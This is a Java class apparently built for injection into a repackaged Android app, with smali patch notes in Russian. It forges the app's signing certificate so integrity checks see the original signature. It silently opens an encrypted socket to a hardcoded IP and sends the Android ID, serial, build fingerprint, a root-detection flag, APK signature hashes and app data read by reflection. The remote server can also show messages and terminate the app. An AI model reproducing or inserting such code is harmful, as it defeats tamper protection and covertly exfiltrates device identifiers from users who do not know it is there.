package Q1;

import android.app.Activity;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.os.Build;
import android.os.Process;
import android.provider.Settings;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.lang.reflect.Method;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.MessageDigest;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.util.Enumeration;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class g {
  public static String a() {
    return "308202d1308201b9a00302010202041b705641300d06092a864886f70d01010b05003018311630140603550403130d536368726f74742047616d65733020170d3137303231313137313833315a180f32313137303131383137313833315a3018311630140603550403130d536368726f74742047616d657330820122300d06092a864886f70d01010105000382010f003082010a028201010091a401a36e6543da0bf48f25f8cab8c7540dff9853cb445651306ef178e6044d5e83cd6d0cc08fc89220beef7a5518752232bc5f7a8195b2d614add596c8f676c3c76d907f6ad4d5895a08742e1e54222fa0c071ea45ef0b26e84238fc4c412dd3a7bc93fa5276ac0d89ec27215ffc8e72f1b2c797a7a51f31a8102ebcb5d37fd89bc39ee73d876feb7c45a3fa443d0737c770b8dfa13a0380a7e1127f0358a139ea8744e6b3071be60480b619bc338374a557b57174596367f691dcd8f8fbbc317cc5e19383c7f9374c065c407bda3c6f742882f2af1f058ec84be267bd91178340e8757270ed399e1677602a58ba5d252280394b0fa4ab45736c65bca19c8f0203010001a321301f301d0603551d0e04160414c69c226606a5354204271a57236be0f3ee123b7f300d06092a864886f70d01010b050003820101004c0a64b0362f3d0c20a515c85be6f494f05c4a0374bc6be1614c1bbb25f77152f8faaa99310eb3da394ae023b445e4578939cad449de2c94b51b481f8e463a56eaeffd145e21dc72a18b01a86073944939a33627d5a1cc2878e13e6101fae5ff4deca204e7f6fbd1d86c0e1da914f138d002c53cddb83cf023a68dc60f1334c1b76e2cf33d4852e14c1ac38cdf93b723f0ce60812906fe5e6a8c195f03ab18d07614f1e653b643c44869699340e3b7a1cb4ef401cc90d5a04bdf34fd0fb4f396286127b749229a5c357d74fa448fbc007aa6d51406121dcc0f1460e335647d22ddf5a862de9f8c53d21397728728b31b5ae6abe00e56e0e515e5c880f4c3eb90";
  }

  public static Signature[] e() {
    return new Signature[] { new Signature(a()) };
/*
после команды:
    iget-object REG, REG, Landroid/content/pm/PackageInfo;->signatures:[Landroid/content/pm/Signature;
дописать:
    invoke-static {}, LQ1/g;->e()[Landroid/content/pm/Signature;
    move-result-object p0
*/
  }



  private Socket socket;
  private BufferedWriter output;
  private BufferedReader input;

  private PrivateKey private_key;
  private PublicKey public_key;
  private SecretKeySpec key;

  private Cipher RSA;
  private Cipher AES;

  private Activity activity;
  private Context context;

  // hex

  static byte[] i(String hex_str) { // hex_decode
    int L = hex_str.length();
    byte[] bytes = new byte[L / 2];
    for (int i = 0; i < L; i += 2)
      bytes[i / 2] = (byte) ((Character.digit(hex_str.charAt(i), 16) << 4) + Character.digit(hex_str.charAt(i+1), 16));
    return bytes;
  }
  
  static String j(byte[] bytes) { // hex_encode
    int L = bytes.length;
    char[] hexChars = new char[L * 2];
    for (int i = 0; i < L; i++) {
      int v = bytes[i] & 0xFF;
      hexChars[i * 2] = Character.forDigit(v >> 4, 16);
      hexChars[i * 2 + 1] = Character.forDigit(v & 15, 16);
    }
    return new String(hexChars);
  }

  // RSA

  void j() throws Exception { // init
    KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
    keyPairGenerator.initialize(1024);
    KeyPair generateKeyPair = keyPairGenerator.generateKeyPair();
    private_key = generateKeyPair.getPrivate();
    public_key = generateKeyPair.getPublic();
    RSA = Cipher.getInstance("RSA/ECB/PKCS1Padding");
    AES = Cipher.getInstance("AES/ECB/PKCS5Padding");
  }
  
  String h(String hex_encoded) throws Exception { // decode
    RSA.init(2, private_key);
    return new String(RSA.doFinal(i(hex_encoded)), "UTF-8");
  }

  String h() { // public_key_DER
    return j(this.public_key.getEncoded());
  }

  // alert

  void k(final String message, final boolean kill) {
    activity.runOnUiThread(new Runnable() {
      @Override public void run() {
        Toast.makeText(context, message, Toast.LENGTH_LONG).show();
        if (kill) {
          new Thread(new Runnable() {
            @Override public void run() {
              try { Thread.sleep(3000); }
              catch (Exception e) {}
              Process.killProcess(Process.myPid());
            }
          }).start();
          activity.finish();
        }
      }
    });
  }
  void k(final String message) {
    k(message, false);
  }

  // net

  boolean f() { // connect
    try {
      try {
        socket = new Socket("185.22.153.51", 20673);
      } catch (Exception unused) { return false; }
      output = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
      input = new BufferedReader(new InputStreamReader(socket.getInputStream()));
      key = null;
      m("IC02" + h());
      String recv = m();
      if (recv == null) return false;
      if (recv.startsWith("EE"))
        n(recv.substring(2));
      recv = h(recv); // decrypt RSA
      key = new SecretKeySpec(i(recv), "AES");
      m(n());
      String resp = m();
      if (resp == null) return false;
      if (!resp.equals("OK"))
        n(resp);
      return true;
    } catch (Exception unused) {
      // Main.stackTrace(unused);
      return false;
    } finally {
      l(false);
    }
  }

  void l(boolean died_socket) { // disconnect
    if (!died_socket) {
      try {
        m("stop");
      } catch (Exception unused) {
        if (socket != null) {
          try { socket.close(); }
          catch (IOException unused2) {}
        }
        return;
      } /*catch (Throwable th) {
        if (socket != null) {
          try { socket.close(); }
          catch (IOException unused) {}
        }
        throw th;
      }*/
    }
    try {
      if (output != null) output.close();
      if (input != null) input.close();
      if (socket != null) socket.close();
    } catch (IOException unused) {}
    socket = null;
  }

  int m(String str) { // send
    if (socket == null || !socket.isConnected())
      return -1;
    try {
      if (key != null) {
        AES.init(1, key);
        str = j(AES.doFinal(str.getBytes()));
      }
      output.write(str);
      output.newLine();
      output.flush();
      return 0;
    } catch (Exception unused) {
      l(true);
      return -1;
    }
  }
  int m(byte[] data) { // bin send
    if (socket == null || !socket.isConnected())
      return -1;
    if (key == null) return -2;
    try {
      AES.init(1, key);
      String str = j(AES.doFinal(data));
      output.write(str);
      output.newLine();
      output.flush();
      return 0;
    } catch (Exception unused) {
      l(true);
      return -1;
    }
  }

  String m() { // recv
    if (socket == null || !socket.isConnected())
      return null;
    try {
      String line = input.readLine();
      if (key == null) return line;
      AES.init(2, key);
      return new String(AES.doFinal(i(line)));
    } catch (Exception unused) {
      l(true);
      return null;
    }
  }

  // main

  void n(String error) { // crush
    k(error, true);
  }
  byte[] n() { // info
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    String androidID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
    o(baos, androidID);               // String
    o(baos, Build.VERSION.RELEASE);   // String
    o(baos, Build.VERSION.SDK_INT);   // int
    o(baos, Build.MANUFACTURER);      // String
    o(baos, Build.MODEL);             // String
    o(baos, Build.BOARD);             // String
    o(baos, Build.HARDWARE);          // String
    o(baos, Build.BRAND);             // String
    o(baos, Build.FINGERPRINT);       // String
    o(baos, Build.PRODUCT);           // String
    o(baos, Build.getRadioVersion()); // String
    o(baos, Build.DISPLAY);           // String
    o(baos, Build.HOST);              // String
    o(baos, Build.USER);              // String
    o(baos, Build.SERIAL);            // String
    o(baos, Build.TIME);              // long
    boolean usb_supported = context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_USB_HOST);
    String flags = (usb_supported ? "+" : "-") + (o() ? "+" : "-");
    o(baos, flags);                   // String
    o(baos, p());                     // String
    o(baos, q());                     // String
    return baos.toByteArray();
  }
  boolean o() { // isRooted
    String[] locations = {"/sbin" , "/system/bin" , "/system/xbin/" , "/system/sd/xbin" , "/system/bin/failsafe/" , "/data/local/xbin/" , "/data/local/bin/" , "/data/local/"};
    for (String location : locations)
      if (new File(location + "su").exists())
        return true;
    return false;
  }
  void o(ByteArrayOutputStream baos, byte num) { // write8
    baos.write(new byte[] { (byte) num }, 0, 1);
  }
  void o(ByteArrayOutputStream baos, short num) { // write16
    baos.write(new byte[] { (byte) num, (byte)(num >> 8) }, 0, 2);
  }
  void o(ByteArrayOutputStream baos, int num) { // write32
    baos.write(new byte[] { (byte) num, (byte)(num >> 8), (byte)(num >> 16), (byte)(num >> 24) }, 0, 4);
  }
  void o(ByteArrayOutputStream baos, long num) { // write64
    baos.write(new byte[] { (byte) num, (byte)(num >> 8), (byte)(num >> 16), (byte)(num >> 24), (byte)(num >> 32), (byte)(num >> 40), (byte)(num >> 48), (byte)(num >> 56) }, 0, 8);
  }
  void o(ByteArrayOutputStream baos, String str) { // writeString
    if (str == null) {
      o(baos, (short) 0xffff);
      return;
    }
    byte[] arr = str.getBytes(StandardCharsets.UTF_8);
    int L = arr.length;
    if (L > 0xfffe) L = 0xfffe;
    o(baos, (short) L);
    baos.write(arr, 0, L);
  }
  String p() {
    try {
      Object obj = Class.forName("O1.b").getField("w").get(null);
      // obj = obj.getClass().getField("d").get(obj);
      // obj = obj.getClass().getField("g").get(obj);
      Method exporter = obj.getClass().getMethod("z", StringBuilder.class);
      StringBuilder sb = new StringBuilder();
      exporter.invoke(obj, sb);
      // k("class: " + obj.getClass().getName());
      return sb.toString();
    } catch (Exception e) { return null; }
  }
  String q() {
    try {
      PackageManager pm = context.getPackageManager();
      PackageInfo info = pm.getPackageInfo(context.getPackageName(), 0);
      ApplicationInfo info2 = info.applicationInfo;
      String path = info2.publicSourceDir == null ? info2.sourceDir : info2.publicSourceDir;

      StringBuilder result = new StringBuilder();
      boolean start = true;

      try (ZipFile zip = new ZipFile(path)) {
        for (Enumeration<? extends ZipEntry> files = zip.entries(); files.hasMoreElements(); ) {
          ZipEntry file = files.nextElement();
          String name = file.getName();
          String lower = name.toLowerCase();
          if (lower.startsWith("meta-inf/") && lower.endsWith(".rsa")) {
            MessageDigest sha256 = MessageDigest.getInstance("SHA-256");
            byte[] buffer = new byte[1024];
            int readed;
            try (InputStream input = zip.getInputStream(file)) {
              while ((readed = input.read(buffer)) > 0)
                sha256.update(buffer, 0, readed);
            }
            byte[] hash = sha256.digest();
            if (start) start = false;
            else result.append("§");
            result.append(name);
            result.append('_');
            result.append(j(hash));
          }
        }
      }
      return result.toString();
    } catch (Exception e) { return null; }
  }

  public void p(Activity me) { // starter
    activity = me;
    context = me.getApplicationContext();
    // k("Serial: " + r());

    new Thread(new Runnable() {
      @Override public void run() {
        try {
          j();
          while (true) {
            if (p() != null && q() != null && f()) break;
            Thread.sleep(500);
          }
        } catch (Exception e) {
          n("error: " + e);
        }
      }
    }).start();
  }
  
  /*String r() { // getSerialNumber
    String serialNumber = null;
    try {
      Class<?> c = Class.forName("android.os.SystemProperties");
      Method get = c.getMethod("get", String.class);
      String[] prop_names = { "gsm.sn1", "ril.serialnumber", "ro.serialno", "sys.serialnumber" };
      for (String prop : prop_names) {
        serialNumber = (String) get.invoke(c, prop);
        Main.print("sn:", serialNumber);
        if (serialNumber != null && serialNumber.length() > 0) break;
      }
      if (serialNumber == null || serialNumber.length() == 0)
        serialNumber = Build.getSerial();
    } catch (Exception e) {
      Main.stackTrace(e);
      return null;
    }
    if (serialNumber != null && serialNumber.length() == 0) return null;
    return serialNumber;
  }*/
}